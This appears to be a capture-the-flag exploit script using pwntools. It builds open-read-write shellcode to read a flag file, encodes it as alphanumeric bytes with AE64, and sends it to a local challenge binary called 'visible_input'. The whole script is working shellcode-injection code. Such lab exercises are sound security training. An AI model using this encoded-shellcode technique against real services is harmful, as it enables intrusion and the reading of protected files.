from pwn import *
from ae64 import AE64

context(os='linux', arch='amd64', log_level='debug')
orw = asm(shellcraft.open('./flag') + shellcraft.read(3, 0x20240300, 0xFF) + shellcraft.write(1, 0x20240300, 0xFF))
enc_orw = AE64().encode(orw, 'rdx', 0, 'fast')
print(disasm(enc_orw))
io = process('./visible_input')
# io = remote('127.0.0.1', 10147)
io.send(enc_orw)
print(io.recv())
